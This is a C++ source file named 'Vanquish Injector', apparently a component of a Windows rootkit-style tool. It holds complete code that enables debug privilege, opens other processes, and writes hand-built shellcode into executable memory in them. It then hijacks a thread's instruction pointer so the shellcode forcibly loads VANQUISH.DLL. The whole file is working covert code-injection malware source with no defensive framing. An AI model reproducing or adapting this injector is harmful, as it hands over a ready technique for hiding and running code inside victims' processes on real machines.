/******************************************************************************\

	Vanquish Injector - Copyright (c)2003-2005 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include "Injector.h"
#include "Utils.h"

EXTERN_MODULE(KERNEL32);

//the thread information block (same linear address for different processes)
LPVOID lpTIB = NULL;

//dll injection debug privilege token size
const DWORD MAX_TOKENPRIVILEGES = 1024;

//injector string
LPCWSTR INJECTOR = L"VANQUISH.DLL";
const DWORD INJECTOR_STRSIZE = 32; //enough space for injector string

LPVOID lpfnLoadLibraryW = NULL; //functions in injected code
LPVOID lpfnFreeLibrary = NULL; //functions in injected code
DWORD dwDebugPrivilege = 0; //is privilege activated?
LUID luidValue;

extern HMODULE ghVanquishImage; //in Hooker.cpp

///////////////////////////////DEBUG PRIVILEGE//////////////////////////////////

//test for and enable privilege module if it is the case
void Vanquish_InitDebugPrivilege()
{
	HANDLE hToken;
	PTOKEN_PRIVILEGES lptkpCurrent = NULL;
	DWORD n, i;

	//by default we don't know what to expect; better safe than sorry...
	dwDebugPrivilege = 0;

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidValue)) goto cleanup;

	lptkpCurrent = (PTOKEN_PRIVILEGES)VRTAlloc(MAX_TOKENPRIVILEGES);
	if (!lptkpCurrent) goto cleanup;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) goto cleanup;

	if (!GetTokenInformation(hToken, TokenPrivileges, lptkpCurrent, MAX_TOKENPRIVILEGES, &n)) goto cleanup;
	
	n = lptkpCurrent->PrivilegeCount;
	for (i = 0; i < n; i++)
	{
		if ((lptkpCurrent->Privileges[i].Luid.HighPart == luidValue.HighPart) && (lptkpCurrent->Privileges[i].Luid.LowPart == luidValue.LowPart))
		{
			if ((lptkpCurrent->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) == SE_PRIVILEGE_ENABLED_BY_DEFAULT)
				dwDebugPrivilege = 1; //we don't need privilege enable; it is default!

			if ((lptkpCurrent->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) == SE_PRIVILEGE_ENABLED)
				dwDebugPrivilege = 1; //we don't need privilege enable; it is enabled!
			break;
		}
	}

cleanup:
	if (lptkpCurrent) VRTFree(lptkpCurrent);
}

//enable debug privilege
BOOL Vanquish_BeginDebugPrivilege(HANDLE hToken, PTOKEN_PRIVILEGES lptkpNew, PTOKEN_PRIVILEGES lptkpOld)
{
	//already debug privilege owner
	if (dwDebugPrivilege == 1) return TRUE;

	BOOL retValue = FALSE;
	DWORD dwSize;

	DWORD dwCheckPoint = 0;
	char *CheckTable[5] = {
		"VRTAlloc(OLD)",
		"VRTAlloc(NEW)",
		"OpenProcessToken",
		"AdjustTokenPrivilege"
	};

	lptkpOld = (PTOKEN_PRIVILEGES)VRTAlloc(MAX_TOKENPRIVILEGES);
	if (!lptkpOld) goto cleanup;
	dwCheckPoint++;

	lptkpOld->PrivilegeCount = MAXDWORD; //for cleanup

	lptkpNew = (PTOKEN_PRIVILEGES)VRTAlloc(MAX_TOKENPRIVILEGES);
	if (!lptkpNew) goto cleanup;
	dwCheckPoint++;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) goto cleanup;
	dwCheckPoint++;

	lptkpNew->PrivilegeCount = 1;
	lptkpNew->Privileges[0].Luid = luidValue;
	lptkpNew->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	SetLastError(ERROR_SUCCESS);
	AdjustTokenPrivileges(hToken, FALSE, lptkpNew, MAX_TOKENPRIVILEGES, lptkpOld, &dwSize);
	if (GetLastError() != ERROR_SUCCESS) goto cleanup;
	dwCheckPoint++;

	//Vanquish_Dump("DEBUG privilege enabled!");
	dwDebugPrivilege = 1;
	retValue = TRUE;

cleanup:
	if (lptkpNew) VRTFree(lptkpNew); //the other one is freed on end privilege call
	/*
	if (!retValue)
	{
		VRTWriteLog(TRUE, GetLastError(), NULL, "Vanquish - Cannot enable DEBUG privilege!\r\n");
		dwDebugPrivilege = 0;
	}
	*/
	return retValue;
}

void Vanquish_EndDebugPrivilege(HANDLE hToken, PTOKEN_PRIVILEGES lptkpOld)
{
	//restore old process privileges
	if (lptkpOld)
	{
		dwDebugPrivilege = 0;
		if (lptkpOld->PrivilegeCount != MAXDWORD)
			AdjustTokenPrivileges(hToken, FALSE, lptkpOld, 0, NULL, NULL);
		VRTFree(lptkpOld);
	}
}

/////////////////////////////PROCESS INJECTOR///////////////////////////////////

//get address of a module function
LPVOID Vanquish_ModuleFunction(LPCTSTR lpszAPIFunction, HMODULE hModule)
{
	LPVOID ret = NULL;

	if (!hModule) return NULL;
	ret = GetProcAddress(hModule, lpszAPIFunction);
	return ret;
}

//prepare the injector
//MUST BE CALLED FROM THE MAIN THREAD ONLY!!!
BOOL Vanquish_PrepareInjector()
{
	//prepare debug privilege
	Vanquish_InitDebugPrivilege();

	//find out the base address for pid of main thread
	__asm push eax
	__asm mov eax, fs:[0x18]
	__asm add eax, 0x24
	__asm mov [lpTIB], eax
	__asm pop eax

	//update the LoadLibraryW address
	lpfnLoadLibraryW = ADDR_OF(LoadLibraryW, KERNEL32);
	if (!lpfnLoadLibraryW)
	{
		VRTWriteLog(FALSE, 0, NULL, "Prepare injector failed! Cannot find address of LoadLibraryW\r\n");
		return FALSE;
	}

	//update the FreeLibrary address
	lpfnFreeLibrary = ADDR_OF(FreeLibrary, KERNEL32);
	if (!lpfnLoadLibraryW)
	{
		VRTWriteLog(FALSE, 0, NULL, "Prepare injector failed! Cannot find address of FreeLibrary\r\n");
		return FALSE;
	}
	return TRUE;
}

////////////////////////THE NEW INJECTOR!///////////////////////////////////////

//the shellcode [Context Fixer]
/*
void __declspec(naked) blah()
{
	__asm pushad
	__asm push 0x0012fab4 //patched dynamically
	__asm call 0x77e7d961 //patched dynamically
	__asm popad
	__asm ret
}
*/

//the shellcode in usable form [Context Fixer]
//pack tightly or it will not work
//TO DO: add instruction for memory unallocation with fake return in the shellcode... :)
#pragma pack(push)
#pragma pack(1)
struct NewInjector {
	unsigned char InjectorName[INJECTOR_STRSIZE];
	unsigned char PUSHFD; //pushfd
	unsigned char PUSHAD; //pushad
	unsigned char PUSHDW; //push the next dword
	DWORD argLoadFreeLib;
	unsigned char MOVESIDW; //mov esi, the next dword
	DWORD addrLoadFreeLib;
	unsigned char CALLESI1; //call esi
	unsigned char CALLESI2; //call esi
	unsigned char POPAD; //popad
	unsigned char POPFD; //popfd
	unsigned char RET; //ret
};
#pragma pack(pop)

const DWORD NEWINJECTOR_SIZE = sizeof(struct NewInjector);

//inject a dll in a process
//DWORD dwSuspend, DWORD dwResume,
BOOL Vanquish_SafeInjectProcess(LPPROCESS_INFORMATION pi, DWORD dwFlags)
{
	//pre-check for bogus process info (e.g. System Idle)
	if ((pi->dwProcessId <= 4) && (pi->hProcess == NULL)) return FALSE;

	BOOL bSuccess = FALSE;

	HANDLE hProcess = NULL, hThread = NULL;
	BOOL bProcess = FALSE, bThread = FALSE;
	DWORD dwThreadId, dwActual;

	BEGIN_DEBUGPRIVILEGE

	//handles have precendence over IDs
	if (pi->hProcess == NULL)
	{
		//hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi->dwProcessId);
		hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pi->dwProcessId);
		if (!hProcess) goto cleanup;
		bProcess = TRUE;
	}
	else
		hProcess = pi->hProcess;

	//handles have precendence over IDs
	if (pi->hThread == NULL)
	{
		dwThreadId = pi->dwThreadId;

		//no thread id
		if (dwThreadId == 0)
		{
			//read the ThreadId from the proc - PROCESS_VM_READ | PROCESS_VM_OPERATION
			if (!ReadProcessMemory(hProcess, lpTIB, (LPVOID)&dwThreadId, sizeof(DWORD), &dwActual)) goto cleanup;

			//check if we read it all
			if (dwActual != sizeof(DWORD)) goto cleanup;
		}

		hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, 0, dwThreadId);
		if (!hThread) goto cleanup;
		bThread = TRUE;
	}
	else
		hThread = pi->hThread;

	//TO DO: after injection resume to IDLE; don't think it's possible
	//actually do it
	if (GetThreadPriority(hThread) == IDLE_PRIORITY_CLASS)
		SetThreadPriority(hThread, THREAD_PRIORITY_NORMAL);

	//TO DO: make sure code is executed by checking return value of suspend thread and calling resume as many times as possible
	//then put them back in place; don't think is possible
	if ((dwFlags & VANQUISHINJECT_PRESUSPENDTHREAD) == VANQUISHINJECT_PRESUSPENDTHREAD) SuspendThread(hThread); //need THREAD_SUSPEND_RESUME
	bSuccess = Vanquish_SafeInjectDLL(hProcess, hThread, dwFlags);
	if ((dwFlags & VANQUISHINJECT_POSTRESUMETHREAD) == VANQUISHINJECT_POSTRESUMETHREAD) ResumeThread(hThread); //need THREAD_SUSPEND_RESUME

cleanup:

	if (bThread) CloseHandle(hThread);
	if (bProcess) CloseHandle(hProcess);

	END_DEBUGPRIVILEGE

	return bSuccess;
}

//TO DO: add instruction for memory unallocation with fake return in the shellcode... :)

//inject dll when we have a handle both to process and main thread
//minimum required PROCESS_VM_WRITE | PROCESS_VM_OPERATION for process
//                 THREAD_SET_CONTEXT | THREAD_GET_CONTEXT for thread
//N.B: hThread must be suspended first or we can fu*k the process!
BOOL Vanquish_SafeInjectDLL(HANDLE hProcess, HANDLE hThread, DWORD dwFlags)
{
	if (!hProcess) return FALSE;
	if (!hThread) return FALSE;

	BOOL bSuccess = FALSE;

	HANDLE hNew = NULL;
	DWORD dwActual;
	LPVOID lpBase = NULL;
	CONTEXT ctx;
	struct NewInjector NEWINJECTOR;

	DWORD dwCheckPoint = 0;
	char *CheckTable[7] = {
		"GetThreadContext",
		"VirtualAllocEx",
		"WriteProcessMemory",
		"VerifyWriteProcessMemory",
		"WriteProcessMemory(ESP)",
		"VerifyWriteProcessMemory(ESP)",
		"SetThreadContext"
	};

	//process sync so that there is only one injection at a time in the system
	VRTCommonExecutionBegin();

	BEGIN_DEBUGPRIVILEGE

	//get context
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &ctx)) goto cleanup;
	dwCheckPoint++;

	//allocate space for function - PROCESS_VM_OPERATION
	//this will be leaked
	if ((lpBase = VirtualAllocEx(hProcess, NULL, NEWINJECTOR_SIZE, MEM_COMMIT | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE)) == NULL) goto cleanup;
	dwCheckPoint++;

	//FOR TESTING; DO NOT UNCOMMENT OTHERWISE
	//lpBase = &NEWINJECTOR;
	//END TESTING;

	//setup code
	lstrcpyW((LPWSTR)(NEWINJECTOR.InjectorName), INJECTOR); //put it into place
	NEWINJECTOR.PUSHFD = 0x9c;
	NEWINJECTOR.PUSHAD = 0x60;
	NEWINJECTOR.PUSHDW = 0x68;
	NEWINJECTOR.argLoadFreeLib = ((dwFlags & VANQUISHINJECT_UNLOADVANQUISH) == VANQUISHINJECT_UNLOADVANQUISH) ? VANQUISH_DLL_UNLOAD_KEY : (DWORD)lpBase;
	NEWINJECTOR.MOVESIDW = 0xbe;
	NEWINJECTOR.addrLoadFreeLib = ((dwFlags & VANQUISHINJECT_UNLOADVANQUISH) == VANQUISHINJECT_UNLOADVANQUISH) ? (DWORD)lpfnFreeLibrary : (DWORD)lpfnLoadLibraryW;
	NEWINJECTOR.CALLESI1 = 0xff; NEWINJECTOR.CALLESI2 = 0xd6;
	NEWINJECTOR.POPAD = 0x61;
	NEWINJECTOR.POPFD = 0x9d;
	NEWINJECTOR.RET = 0xc3;

	//FOR TESTING; DO NOT UNCOMMENT OTHERWISE
	//dwActual = (DWORD)lpBase + INJECTOR_STRSIZE;
	//__asm call [dwActual]
	//END TESTING;
	
	//write the injector code - PROCESS_VM_WRITE & PROCESS_VM_OPERATION
	if (!WriteProcessMemory(hProcess, lpBase, (LPVOID)&NEWINJECTOR, NEWINJECTOR_SIZE, &dwActual)) goto cleanup;
	dwCheckPoint++;

	//check if we wrote all of the injector code
	if (dwActual != NEWINJECTOR_SIZE) goto cleanup;
	dwCheckPoint++;

	//***BEGIN simulate a stdcall to Context Fixer

	//simulate push of the ret addr (eip)
	ctx.Esp -= 4;
	if (!WriteProcessMemory(hProcess, (LPVOID)ctx.Esp, &(ctx.Eip), sizeof(DWORD), &dwActual)) goto cleanup;
	dwCheckPoint++;

	//check if we wrote all of the eip to stack
	if (dwActual != sizeof(DWORD)) goto cleanup;
	dwCheckPoint++;

	//simulate jmp to our code
	ctx.Eip = (DWORD)lpBase + INJECTOR_STRSIZE;
	//description:            ^to skip buf

	//***END simulate a stdcall to Context Fixer

	//update context
	if (!SetThreadContext(hThread, &ctx)) goto cleanup;

	bSuccess = TRUE;

cleanup:

	if (!bSuccess)
	{
		dwActual = GetLastError();
		VRTWriteLog(TRUE, dwActual, NULL, "Vanquish - DLL injection failed:\r\n%s\r\n", CheckTable[dwCheckPoint]);
	}

	//free up memory; DOESN'T WORK BECAUSE WE WILL CRASH THE TARGET
	//if (lpBase) VirtualFreeEx(hTarget, lpBase, 0, MEM_RELEASE);

	END_DEBUGPRIVILEGE

	//release execution sync(other injectors cand do their job now!)
	VRTCommonExecutionEnd();

	return bSuccess;
}
